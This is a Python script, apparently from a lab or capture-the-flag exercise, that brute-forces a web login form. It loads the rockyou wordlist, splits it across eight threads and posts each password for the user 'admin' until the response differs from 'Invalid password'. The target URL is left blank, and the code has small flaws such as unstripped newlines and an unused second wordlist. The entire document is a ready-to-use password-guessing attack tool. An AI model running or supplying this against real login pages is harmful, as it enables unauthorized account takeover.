import requests
from tqdm import tqdm
import threading
import numpy as np

url = ""
headers = {'content-type': 'application/x-www-form-urlencoded'}
username = "admin"

fasttrack = open("/usr/share/wordlists/fasttrack.txt", "r")
rockyou = open("/usr/share/wordlists/rockyou.txt", "r")
print(rockyou)

passwords = rockyou.readlines()
print("passwords: ", passwords)
fasttrack.close()

WRONG_USR = "Invalid username"
WRONG_PW = "Invalid password"

THREAD_NUMBER = 8

def brute_force_passwords(passwords_part):
    found_password = None
    for password in tqdm(passwords_part):
        payload = f"username={username}&password={password}"
        request = requests.post(url, data=payload, headers=headers)
        response = request.content.decode("ascii")
        if response != WRONG_PW:
            found_password = password
            print(f"[*] Password found: {found_password}")
            break
    if not found_password:
        print(f"[-] No password was found for given username: {username}")

splitted_passwords = list(np.array_split(passwords, THREAD_NUMBER))
for thread_number in range(THREAD_NUMBER):
    thread = threading.Thread(target=brute_force_passwords, args=(splitted_passwords[thread_number],))
    thread.start()
